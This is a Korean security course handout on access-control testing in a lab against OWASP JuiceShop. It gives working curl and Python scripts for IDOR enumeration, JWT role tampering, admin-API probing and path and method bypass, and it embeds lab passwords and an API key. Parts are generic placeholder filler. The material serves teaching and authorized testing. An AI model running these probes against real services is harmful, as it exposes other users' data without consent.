# Week 09: 접근제어 점검 (상세 버전)

## 학습 목표
- 수평적/수직적 권한 상승의 차이를 이해한다
- IDOR(Insecure Direct Object Reference)를 탐지하고 공격할 수 있다
- API 접근제어의 취약점을 점검한다
- JuiceShop에서 다양한 접근제어 우회를 실습한다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


# 본 강의 내용

# Week 09: 접근제어 점검

## 학습 목표
- 수평적/수직적 권한 상승의 차이를 이해한다
- IDOR(Insecure Direct Object Reference)를 탐지하고 공격할 수 있다
- API 접근제어의 취약점을 점검한다
- JuiceShop에서 다양한 접근제어 우회를 실습한다

## 전제 조건
- HTTP 인증/인가 개념 (Week 04)
- curl + JWT 토큰 사용법

---

## 1. 접근제어 개요 (15분)

### 1.1 접근제어란?

접근제어(Access Control)는 인증된 사용자가 허가된 자원에만 접근할 수 있도록 제한하는 메커니즘이다.

### 1.2 OWASP에서의 위치

**A01:2021 Broken Access Control** — OWASP Top 10의 1위. 가장 심각하고 빈번한 웹 취약점이다.

### 1.3 권한 상승 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **수직적 권한 상승** | 낮은 권한 → 높은 권한 | 일반 사용자 → 관리자 |
| **수평적 권한 상승** | 같은 권한의 다른 사용자 자원 접근 | 사용자A → 사용자B의 데이터 |
| **미인증 접근** | 인증 없이 보호된 자원 접근 | 로그인 안하고 관리 페이지 |

```
수직적 (Vertical)        수평적 (Horizontal)
┌──────────┐            ┌─────┬─────┐
│  관리자   │ ← 목표    │ 유저A │ 유저B │
├──────────┤            │     │ ← 목표│
│ 일반유저  │ ← 현재    │현재  │     │
└──────────┘            └─────┴─────┘
```

---

## 2. IDOR (Insecure Direct Object Reference) (40분)

### 2.1 IDOR란?

IDOR은 서버가 사용자의 요청에 포함된 객체 식별자(ID)를 검증하지 않아, 다른 사용자의 자원에 접근할 수 있는 취약점이다.

```
정상: GET /api/basket/1  (내 장바구니, ID=1)
공격: GET /api/basket/2  (다른 사용자 장바구니, ID=2)
```

### 2.2 JuiceShop 장바구니 IDOR

```bash
# 계정 2개 생성 및 로그인
# 계정 1
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user1@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' > /dev/null 2>&1

TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user1@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 계정 2
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user2@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' > /dev/null 2>&1

TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user2@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

echo "사용자1 토큰: ${TOKEN1:0:30}..."
echo "사용자2 토큰: ${TOKEN2:0:30}..."

# 사용자1의 장바구니 ID 확인
echo ""
echo "=== 사용자1이 자신의 장바구니 조회 ==="
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN1" | python3 -m json.tool 2>/dev/null | head -10

# IDOR: 사용자1의 토큰으로 사용자2의 장바구니 조회 시도
echo ""
echo "=== 사용자1이 다른 사용자의 장바구니 조회 (IDOR) ==="
for basket_id in 1 2 3 4 5; do
  result=$(curl -s http://10.20.30.80:3000/rest/basket/$basket_id \
    -H "Authorization: Bearer $TOKEN1" -w "\nHTTP:%{http_code}" 2>/dev/null)
  code=$(echo "$result" | grep "HTTP:" | cut -d: -f2)
  echo "Basket $basket_id: HTTP $code"
done
```

### 2.3 사용자 정보 IDOR

```bash
# 사용자 정보 API에서 IDOR
echo "=== 사용자 정보 IDOR ==="

# 다른 사용자의 프로필 조회 시도
for user_id in 1 2 3 4 5; do
  result=$(curl -s http://10.20.30.80:3000/api/Users/$user_id \
    -H "Authorization: Bearer $TOKEN1")
  email=$(echo "$result" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('email','접근 거부'))" 2>/dev/null)
  echo "User $user_id: $email"
done
```

### 2.4 주문 정보 IDOR

```bash
# 주문 내역 조회 IDOR
echo "=== 주문 내역 IDOR ==="
for order_id in 1 2 3 4 5; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://10.20.30.80:3000/rest/track-order/$order_id \
    -H "Authorization: Bearer $TOKEN1")
  echo "Order $order_id: HTTP $code"
done
```

### 2.5 IDOR 자동 탐지 스크립트

```bash
# ID 기반 API 엔드포인트 자동 스캔
python3 << 'PYEOF'
import requests, json

token = None
# 로그인
r = requests.post("http://10.20.30.80:3000/rest/user/login",
    json={"email":"idor_user1@test.com","password":"Test1234!"})
try:
    token = r.json()["authentication"]["token"]
except:
    print("로그인 실패")
    exit()

headers = {"Authorization": f"Bearer {token}"}

# IDOR 점검 대상 API
endpoints = [
    "/api/Users/{id}",
    "/rest/basket/{id}",
    "/api/Feedbacks/{id}",
    "/api/Products/{id}",
    "/api/Complaints/{id}",
    "/rest/track-order/{id}",
]

print(f"{'API':<35} {'ID=1':>8} {'ID=2':>8} {'ID=99':>8}")
print("-" * 65)

for ep in endpoints:
    results = []
    for test_id in [1, 2, 99]:
        url = f"http://10.20.30.80:3000{ep.replace('{id}', str(test_id))}"
        try:
            r = requests.get(url, headers=headers, timeout=5)
            results.append(str(r.status_code))
        except:
            results.append("ERR")
    print(f"{ep:<35} {results[0]:>8} {results[1]:>8} {results[2]:>8}")
    # ID 1,2 모두 200이면 IDOR 가능성
    if results[0] == "200" and results[1] == "200":
        print(f"  ⚠ IDOR 가능성 높음!")
PYEOF
```

---

## 3. 수직적 권한 상승 (30분)

### 3.1 관리자 기능 접근 시도

```bash
# 일반 사용자 토큰으로 관리자 API 접근
echo "=== 관리자 기능 접근 시도 ==="

# 관리자 페이지
curl -s -o /dev/null -w "관리자 페이지: %{http_code}\n" \
  http://10.20.30.80:3000/administration \
  -H "Authorization: Bearer $TOKEN1"

# 사용자 목록 (관리자 전용)
curl -s -o /dev/null -w "사용자 목록: %{http_code}\n" \
  http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $TOKEN1"

# 피드백 삭제 (관리자 전용)
curl -s -o /dev/null -w "피드백 삭제: %{http_code}\n" \
  -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 \
  -H "Authorization: Bearer $TOKEN1"

# 재활용 요청 (관리자 전용)
curl -s -o /dev/null -w "재활용 관리: %{http_code}\n" \
  http://10.20.30.80:3000/api/Recycles/ \
  -H "Authorization: Bearer $TOKEN1"
```

### 3.2 JWT 조작으로 권한 상승

```bash
# JWT payload에서 role을 admin으로 변조 시도
python3 << 'PYEOF'
import base64, json, requests

# 로그인하여 정상 토큰 획득
r = requests.post("http://10.20.30.80:3000/rest/user/login",
    json={"email":"idor_user1@test.com","password":"Test1234!"})
token = r.json()["authentication"]["token"]
parts = token.split(".")

# payload 디코딩
payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_b64))
print(f"원본 payload: {json.dumps(payload, indent=2)}")

# role을 admin으로 변조
payload["data"]["role"] = "admin"
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()

# 조작된 토큰 (서명은 원본 유지 → 서버에서 검증 실패할 수 있음)
fake_token = f"{parts[0]}.{new_payload}.{parts[2]}"

# 조작된 토큰으로 관리자 API 접근
r = requests.get("http://10.20.30.80:3000/api/Users/",
    headers={"Authorization": f"Bearer {fake_token}"})
print(f"\n조작 토큰으로 사용자 목록: HTTP {r.status_code}")
if r.status_code == 200:
    print("⚠ 권한 상승 성공!")
else:
    print("서명 검증으로 차단됨 (양호)")
PYEOF
```

### 3.3 역할 변경 API 존재 여부

```bash
# 사용자 역할을 변경하는 API가 있는지 탐색
echo "=== 역할 변경 API 탐색 ==="

# PUT으로 사용자 정보 수정 시 role 포함
curl -s -X PUT http://10.20.30.80:3000/api/Users/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN1" \
  -d '{"role":"admin"}' | python3 -m json.tool 2>/dev/null | head -10
```

---

## 4. 인증 없는 접근 (20분)

### 4.1 인증 미적용 API 탐색

```bash
# 인증 헤더 없이 각 API에 접근
echo "=== 인증 없이 접근 가능한 API ==="

APIS=(
  "api/Products/1"
  "api/Feedbacks/"
  "api/Challenges/"
  "api/SecurityQuestions/"
  "api/Users/"
  "api/Complaints/"
  "api/Recycles/"
  "api/Quantitys/"
  "rest/products/search?q=test"
  "rest/user/whoami"
  "rest/basket/1"
  "rest/languages"
  "rest/memories"
  "rest/chatbot/status"
  "ftp/"
  "metrics"
  "promotion"
)

for api in "${APIS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
  if [ "$code" = "200" ]; then
    echo "[공개] /$api (HTTP $code)"
  elif [ "$code" = "401" ] || [ "$code" = "403" ]; then
    echo "[보호] /$api (HTTP $code)"
  else
    echo "[기타] /$api (HTTP $code)"
  fi
done
```

### 4.2 HTTP 메서드 우회

```bash
# GET은 차단되지만 다른 메서드로 접근 가능한지 테스트
echo "=== HTTP 메서드 우회 ==="
TARGET="http://10.20.30.80:3000/api/Users/"

for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET")
  echo "$method: HTTP $code"
done
```

### 4.3 경로 우회

```bash
# URL 변형으로 접근 제어 우회 시도
echo "=== 경로 우회 ==="
PATHS=(
  "/administration"
  "/Administration"
  "/ADMINISTRATION"
  "/administration/"
  "/administration/."
  "/./administration"
  "/%61dministration"
  "/admin"
  "/api/Users/"
)

for path in "${PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path" -H "Authorization: Bearer $TOKEN1")
  echo "[$code] $path"
done
```

---

## 5. API 접근제어 점검 (15분)

### 5.1 REST API 보안 체크리스트

| 점검 항목 | 확인 방법 |
|----------|----------|
| 인증 필수 여부 | 토큰 없이 요청 |
| 인가 검증 | 다른 사용자 자원 접근 |
| 메서드 제한 | DELETE, PUT 등 허용 여부 |
| Rate Limiting | 대량 요청 시 429 응답 |
| 응답 필터링 | 불필요한 필드 노출 |

### 5.2 응답 데이터 과다 노출

```bash
# API 응답에 불필요한 정보가 포함되는지 확인
echo "=== 응답 필드 점검 ==="

# 상품 API - password 해시 등 민감 정보 포함 여부
curl -s http://10.20.30.80:3000/api/Products/1 | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', {})
print('포함된 필드:')
for key in data.keys():
    print(f'  - {key}: {str(data[key])[:50]}')
" 2>/dev/null

echo ""

# 사용자 API - password 해시 노출 여부
curl -s http://10.20.30.80:3000/api/Users/1 \
  -H "Authorization: Bearer $TOKEN1" | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', {})
sensitive = ['password', 'passwordHash', 'token', 'secret', 'creditCard']
for key in data.keys():
    marker = ' ⚠ 민감!' if key.lower() in [s.lower() for s in sensitive] else ''
    print(f'  - {key}: {str(data[key])[:40]}{marker}')
" 2>/dev/null
```

---

## 6. 실습 과제

### 과제 1: IDOR 탐색
1. JuiceShop의 모든 ID 기반 API에서 IDOR을 테스트하라
2. 다른 사용자의 장바구니, 주문, 프로필을 조회할 수 있는지 확인하라
3. IDOR이 가능한 API와 불가능한 API를 비교 분석하라

### 과제 2: 권한 상승
1. 일반 사용자로 관리자 기능에 접근을 시도하라
2. JWT 조작, 경로 우회, 메서드 변경 등 다양한 방법을 시도하라
3. 성공/실패 결과를 정리하고 서버의 접근제어 방식을 추론하라

### 과제 3: 접근제어 점검 보고서
1. 인증 없이 접근 가능한 API 목록을 작성하라
2. 각 API가 공개되어야 하는 것인지, 보호가 필요한지 평가하라
3. 접근제어 개선 권고 사항을 3가지 이상 작성하라

---

## 7. 요약

| 취약점 | 공격 방법 | 영향 | 방어 |
|--------|----------|------|------|
| IDOR | ID 값 변경 | 다른 사용자 데이터 접근 | 서버 측 소유자 검증 |
| 수직적 권한 상승 | 관리자 API 직접 호출 | 관리자 기능 사용 | 역할 기반 접근제어(RBAC) |
| 인증 미적용 | 토큰 없이 요청 | 민감 정보 노출 | 인증 미들웨어 |
| 메서드 우회 | PUT/DELETE 사용 | 데이터 변조/삭제 | HTTP 메서드 화이트리스트 |

**다음 주 예고**: Week 10 - 암호화/통신 보안. HTTPS 설정, 인증서 점검, 약한 암호 스위트를 학습한다.


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 3)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 09: 접근제어 점검"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 OWASP의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

